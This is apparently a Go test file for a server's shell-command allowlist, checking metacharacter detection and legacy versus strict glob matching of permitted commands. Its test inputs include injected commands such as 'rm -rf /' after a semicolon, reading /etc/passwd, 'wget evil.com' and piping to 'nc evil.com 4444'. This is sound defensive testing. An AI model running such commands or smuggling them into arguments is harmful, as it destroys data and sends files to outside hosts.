package server

import "testing"

func TestContainsShellMetachars(t *testing.T) {
	tests := []struct {
		cmd string
		has bool
	}{
		{"systemctl restart nginx", false},
		{"df -h", false},
		{"ps aux", false},
		{"journalctl -u nginx --since today", false},
		{"bash /opt/scripts/deploy.sh", false},
		{"systemctl restart x; rm -rf /", true},
		{"ps aux | grep nginx", true},
		{"cmd1 && cmd2", true},
		{"echo $(date)", true},
		{"cat /etc/passwd > /tmp/out", true},
		{"echo hello && echo world", true},
		{"cd /tmp ; wget evil.com", true},
		{`echo "hello" | nc evil.com 4444`, true},
	}
	for _, tt := range tests {
		got := containsShellMetachars(tt.cmd)
		if got != tt.has {
			t.Errorf("containsShellMetachars(%q) = %v, want %v", tt.cmd, got, tt.has)
		}
	}
}

func TestGlobMatchLegacy(t *testing.T) {
	tests := []struct {
		pattern, s string
		want       bool
	}{
		{"systemctl restart *", "systemctl restart nginx", true},
		{"systemctl restart *", "systemctl restart x; rm -rf /", true}, // legacy 允许
		{"ps *", "ps aux | grep nginx", true},                          // legacy 允许
		{"systemctl status *", "systemctl status docker", true},
		{"cat /etc/*", "cat /etc/nginx/nginx.conf", true},
		{"exact", "exact", true},
		{"exact", "other", false},
	}
	for _, tt := range tests {
		got := globMatch(tt.pattern, tt.s)
		if got != tt.want {
			t.Errorf("globMatch(%q, %q) = %v, want %v", tt.pattern, tt.s, got, tt.want)
		}
	}
}

func TestGlobMatchStrict(t *testing.T) {
	tests := []struct {
		pattern, s string
		want       bool
	}{
		// 精确规则(无*): 允许元字符
		{"ps aux | grep nginx", "ps aux | grep nginx", true},
		{"ps aux | grep nginx", "ps aux | grep sshd", false},
		// 带 * 规则: * 不匹配元字符
		{"systemctl restart *", "systemctl restart nginx", true},
		{"systemctl restart *", "systemctl restart x; rm -rf /", false}, // strict 拦截
		{"systemctl status *", "systemctl status docker", true},
		{"ps *", "ps aux | grep nginx", false}, // strict 拦截管道
		{"cat /etc/*", "cat /etc/nginx/nginx.conf", true},
		{"systemctl *", "systemctl restart nginx", true},
		// 多 * 模式
		{"*status*", "systemctl status docker", true},
		{"*status*", "systemctl status; rm -rf /", false},
		// * 匹配空串
		{"systemctl restart *", "systemctl restart ", true},
	}
	for _, tt := range tests {
		got := globMatchStrict(tt.pattern, tt.s)
		if got != tt.want {
			t.Errorf("globMatchStrict(%q, %q) = %v, want %v", tt.pattern, tt.s, got, tt.want)
		}
	}
}

func TestValidShellMatchMode(t *testing.T) {
	tests := []struct {
		input, want string
	}{
		{"legacy", "legacy"},
		{"permissive", "permissive"},
		{"strict_chars", "strict_chars"},
		{"strict_glob", "strict_glob"},
		{"unknown", "strict_glob"},
		{"", "strict_glob"},
	}
	for _, tt := range tests {
		got := validShellMatchMode(tt.input)
		if got != tt.want {
			t.Errorf("validShellMatchMode(%q) = %v, want %v", tt.input, got, tt.want)
		}
	}
}
